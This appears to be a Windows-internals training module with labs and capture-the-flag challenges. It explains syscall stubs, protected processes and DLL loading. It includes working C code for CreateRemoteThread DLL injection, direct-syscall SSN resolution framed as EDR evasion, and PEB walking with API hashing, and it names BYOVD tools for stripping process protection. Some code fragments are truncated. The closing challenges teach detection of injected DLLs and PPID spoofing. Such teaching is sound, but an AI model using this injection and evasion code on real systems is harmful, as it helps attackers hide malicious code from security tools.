Windows Internals

Windows API Layers

Every user-mode API call flows through the same pipeline:

// User code
CreateFile(...)                     // kernel32.dll (Win32 API)
  → NtCreateFile(...)              // ntdll.dll (native API wrapper)
    → syscall instruction          // transition to kernel mode
      → nt!NtCreateFile            // kernel-mode handler
LayerDLLRole
Win32 APIkernel32, user32, advapi32Documented, stable API surface
Native APIntdll.dllThin wrappers that set up syscall number + args
Syscall stubntdll.dllmov r10, rcx; mov eax, SSN; syscall
Kernelntoskrnl.exeActual implementation via SSDT dispatch

Syscall Stubs in ntdll

// Typical ntdll syscall stub (x64):
NtCreateFile:
  mov r10, rcx          // rcx is clobbered by syscall, save to r10
  mov eax, 0x55         // System Service Number (SSN) — varies by build
  test byte ptr [SharedUserData+0x308], 1
  jne  use_int2e        // fallback for older CPUs
  syscall
  ret
use_int2e:
  int 2Eh
  ret

Direct Syscalls (EDR Evasion)

Malware calls syscall directly to bypass ntdll hooks placed by EDRs. Requires resolving the correct SSN per OS build.

// Concept: read SSN from ntdll's own stub, then invoke syscall directly
// Avoids executing ntdll code where EDR inline hooks live
DWORD GetSSN(const char *funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE *func = (BYTE *)GetProcAddress(ntdll, funcName);
    // SSN is at offset +4 in the stub: mov eax, 
    if (func[0] == 0x4c && func[3] == 0xb8)
        return *(DWORD *)(func + 4);
    return 0;
}

DKOM (Direct Kernel Object Manipulation): Rootkits unlink a process from ActiveProcessLinks to hide it from Task Manager. The process still runs (scheduler uses KPROCESS) but disappears from the linked list that NtQuerySystemInformation walks.

User-mode structure accessible via fs:[0x30] (x86) or gs:[0x60] (x64). Contains info the process needs at runtime.

Process Creation Flow (Brief)

  1. CreateProcessW → validates parameters, finds executable
  2. NtCreateUserProcess → creates EPROCESS, KPROCESS, address space (CR3), maps ntdll
  3. Kernel creates initial thread (ETHREAD/KTHREAD)
  4. PEB + TEB allocated in new process address space
  5. Image + ntdll mapped; kernel returns to user mode
  6. ntdll!LdrInitializeThunk → initializes loader, walks DLL imports, calls DllMain for each
  7. Control transfers to application entry point

Protected Processes (PP / PPL)

Windows restricts which access rights can be obtained on protected processes. Even administrators cannot open them with PROCESS_ALL_ACCESS.

LevelSignerExamples
Protected (PP)WinSystemSystem process, Secure System
Protected Light (PPL)WinTcbcsrss.exe, smss.exe
PPLWindowsservices.exe, svchost.exe (some)
PPLAntimalwareMsMpEng.exe (Defender)
PPLLsalsass.exe (when RunAsPPL enabled)
PPLAuthenticodeThird-party signed services

Hierarchy: A process can only open a target with full access if its signer level is ≥ the target's. PP > PPL. Within PP or PPL, signer ranking: WinSystem > WinTcb > Windows > Antimalware > Lsa > Authenticode.

Bypasses: Load a vulnerable signed driver (e.g., with known BYOVD exploits) to strip the Protection field from EPROCESS in kernel memory. Tools: PPLKiller, PPLdump, mimidrv.sys.

DLL Loading

LoadLibrary Flow

  1. LoadLibraryW (kernel32) → LdrLoadDll (ntdll)
  2. Loader checks if DLL is already in the LDR module list
  3. If not loaded: resolves path using DLL search order
  4. Maps the DLL into the process address space (NtMapViewOfSection)
  5. Processes imports (recursive loading)
  6. Calls DllMain(DLL_PROCESS_ATTACH)
  7. Adds entry to all three LDR lists

LDR Module Lists

PEB→Ldr→ contains three linked lists. Each entry is a LDR_DATA_TABLE_ENTRY with DllBase, EntryPoint, FullDllName, SizeOfImage.

ListOrder
InLoadOrderModuleListOrder DLLs were loaded
InMemoryOrderModuleListOrder by memory address
InInitializationOrderModuleListOrder DllMain was called (exe excluded)

DLL Search Order (Hijacking)

When SafeDllSearchMode is enabled (default):

  1. Directory of the application (the .exe)
  2. System directory (C:\Windows\System32)
  3. 16-bit system directory (C:\Windows\System)
  4. Windows directory (C:\Windows)
  5. Current working directory
  6. Directories in PATH

DLL Hijacking: If the application loads a DLL that doesn't exist in the early search locations, place a malicious DLL with the same name in a location searched first (e.g., the application directory).

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

DWORD FindProcess(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main() {
    printf("[*] Enabling SeDebugPrivilege...\n");

        printf("[-] Failed. Run as Administrator.\n");
        return 1;

Lab 3: DLL Injection

Hard

Objective: Inject a custom DLL into a target process using the classic CreateRemoteThread technique. Understand each step and why it works.

// payload.dll — DLL to inject
// Compile: cl.exe /LD payload.c /Fe:payload.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "DLL Injected!", "Lab 3", MB_OK);

}

// injector.c — Injects payload.dll into target process
// Compile: cl.exe injector.c /Fe:injector.exe
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD FindProcess(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: injector.exe <process_name> <dll_path>\n");
        return 1;
    }

    const char *target = argv[1];
    const char *dllPath = argv[2];

    // Step 1: Find target PID
    DWORD pid = FindProcess(target);
    if (!pid) { printf("[-] Process not found.\n"); return 1; }
    printf("[+] Target PID: %lu\n", pid);

    // Step 2: Open target process
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return 1; }

    // Step 3: Allocate memory in target for DLL path string
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) { printf("[-] VirtualAllocEx failed.\n"); return 1; }
    printf("[+] Remote buffer: 0x%p\n", remoteBuf);

    // Step 4: Write DLL path into target process memory
    WriteProcessMemory(hProc, remoteBuf, dllPath, pathLen, NULL);

    // Step 5: Get address of LoadLibraryA in kernel32
    // (kernel32 is at the same address in all processes due to ASLR per-boot)
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    printf("[+] LoadLibraryA: 0x%p\n", loadLibAddr);

    // Step 6: Create remote thread that calls LoadLibraryA(dllPath)
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr, remoteBuf, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread failed.\n"); return 1; }

    printf("[+] Remote thread created. DLL injected!\n");
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

Lab 8: Direct Syscall Implementation

Objective: Implement direct syscalls to bypass EDR hooks in ntdll.dll by dynamically resolving System Service Numbers.

// syscall_direct.c — Resolve SSN and invoke syscalls directly
// Compile: cl.exe syscall_direct.c /Fe:syscall_direct.exe
#include <windows.h>
#include <stdio.h>

// SSN resolver: reads the mov eax, SSN instruction from ntdll stub
DWORD GetSSN(const char *funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE *pFunc = (BYTE *)GetProcAddress(ntdll, funcName);
    if (!pFunc) return -1;

    // Check for standard stub pattern: 4C 8B D1 B8 XX XX 00 00
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(DWORD *)(pFunc + 4);
    }

    // If hooked (jmp/call at start), walk neighboring stubs
    // Halo's Gate / Hell's Gate technique
    printf("[!] %s appears hooked, trying neighbor resolution\n", funcName);
    for (int i = 1; i < 500; i++) {
        // Check upward neighbor
        if (*(pFunc - i * 32 + 0) == 0x4C && *(pFunc - i * 32 + 3) == 0xB8) {
            return *(DWORD *)(pFunc - i * 32 + 4) + i;
        }
        // Check downward neighbor
        if (*(pFunc + i * 32 + 0) == 0x4C && *(pFunc + i * 32 + 3) == 0xB8) {
            return *(DWORD *)(pFunc + i * 32 + 4) - i;
        }
    }
    return -1;
}

int main() {
    // Resolve SSNs for key functions
    const char *funcs[] = {
        "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtCreateThreadEx", "NtProtectVirtualMemory",
        "NtOpenProcess", "NtClose"
    };

    printf("%-30s SSN\n", "Function");
    printf("%-30s ---\n", "--------");
    for (int i = 0; i < 6; i++) {
        DWORD ssn = GetSSN(funcs[i]);
        printf("%-30s 0x%04X (%d)\n", funcs[i], ssn, ssn);
    }
    return 0;
}

Lab 13: PEB Walking for DLL Resolution

Objective: Resolve API function addresses by walking PEB → LDR → InLoadOrderModuleList without calling GetProcAddress — a core malware evasion technique.

// peb_resolve.c — Resolve API by hash without GetProcAddress
// Compile: cl.exe peb_resolve.c /Fe:peb_resolve.exe
#include <windows.h>
#include <stdio.h>

// djb2 hash of a string
DWORD HashString(const char *str) {
    DWORD hash = 5381;
    while (*str) hash = ((hash << 5) + hash) + (unsigned char)*str++;
    return hash;
}

// Walk PEB → Ldr → InLoadOrderModuleList to find a DLL base by hash
HMODULE GetModuleByHash(DWORD hash) {
    // Access PEB via TEB (gs:[0x60] on x64)
    #ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
    #else
    PPEB peb = (PPEB)__readfsdword(0x30);
    #endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        // Convert wide name to ASCII for hashing
        char name[256] = {0};
        int len = entry->FullDllName.Length / sizeof(WCHAR);
        // Extract just the filename
        WCHAR *wName = entry->FullDllName.Buffer;
        for (int i = len - 1; i >= 0; i--) {
            if (wName[i] == L'\\') { wName += i + 1; len -= i + 1; break; }
        }
        for (int i = 0; i < len && i < 255; i++)
            name[i] = (char)(wName[i] | 0x20); // tolower

        if (HashString(name) == hash)
            return (HMODULE)entry->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

int main() {
    // Hash of "kernel32.dll"
    DWORD k32hash = HashString("kernel32.dll");
    printf("[*] Hash of 'kernel32.dll': 0x%08X\n", k32hash);

    HMODULE k32 = GetModuleByHash(k32hash);
    printf("[+] kernel32.dll base via PEB walk: %p\n", k32);
    printf("[+] kernel32.dll base via GetModuleHandle: %p\n",
        GetModuleHandleA("kernel32.dll"));
    printf("[*] Match: %s\n", k32 == GetModuleHandleA("kernel32.dll") ? "YES" : "NO");
    return 0;
}

Challenge 9: Find the Injected DLL

Medium

A legitimate process has been compromised — an attacker injected a malicious DLL. Find the injected DLL by identifying unsigned modules or modules loaded from suspicious paths. The flag is the DLL filename.

# Approach 1: Check for unsigned DLLs in a process
$proc = Get-Process -Name "target_process"
$proc.Modules | ForEach-Object {
    $sig = Get-AuthenticodeSignature $_.FileName -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Module  = $_.ModuleName
        Path    = $_.FileName
        Signed  = $sig.Status
    }
} | Where-Object { $_.Signed -ne "Valid" } | Format-Table -AutoSize

# Approach 2: Look for DLLs loaded from temp/user directories
$proc.Modules | Where-Object {
    $_.FileName -match "\\Temp\\|\\AppData\\|\\Downloads\\"
} | Format-Table ModuleName, FileName

Injected DLLs often have these indicators: (1) Unsigned — no valid Authenticode signature, (2) Loaded from unusual paths (%TEMP%, %APPDATA%, C:\Users\Public), (3) Not in the process's import table (loaded dynamically), (4) Suspicious names or random characters. In Process Explorer: enable "Verify Image Signatures" under Options. Yellow-highlighted DLLs are unsigned. Also check with listdlls.exe -u <process> from Sysinternals to show unsigned DLLs.

Challenge 10: Parent PID Spoofing Detection

Hard

An attacker used PPID spoofing to make a malicious process appear as a child of explorer.exe. Detect the spoofed process by correlating actual parent with claimed parent. The flag is the real parent PID.

# PPID Spoofing: process claims explorer.exe as parent, but was
# actually spawned by cmd.exe. Detect the discrepancy.

# Method 1: Compare CreationTime — child should be created AFTER parent
Get-CimInstance Win32_Process | ForEach-Object {
    $parent = Get-CimInstance Win32_Process -Filter "ProcessId = $($_.ParentProcessId)" -ErrorAction SilentlyContinue
    if ($parent -and $_.CreationDate -lt $parent.CreationDate) {
        Write-Host "[!] SPOOFED: $($_.Name) (PID: $($_.ProcessId)) claims parent $($parent.Name) (PID: $($_.ParentProcessId)) but parent was created AFTER child!"
    }
}

# Method 2: ETW tracing — ProcessStart events contain the real creating process
# The creating process (from ETW) may differ from the ParentProcessId field
// How PPID spoofing works (for understanding the attack):
// STARTUPINFOEX si = {0};
// si.lpAttributeList → PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
// The parent PID in EPROCESS is set to the spoofed value
// But ETW events and creation timestamps reveal the truth

PPID spoofing uses UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) during CreateProcess. The InheritedFromUniqueProcessId field in EPROCESS is set to the spoofed PID. Detection: (1) Creation timestamp analysis — a child can't be older than its parent. (2) ETW ProcessStart events record the actual creating process PID in the event data, which differs from the PPID field. (3) Check if the claimed parent logically makes sense (e.g., powershell.exe with parent winlogon.exe is suspicious).
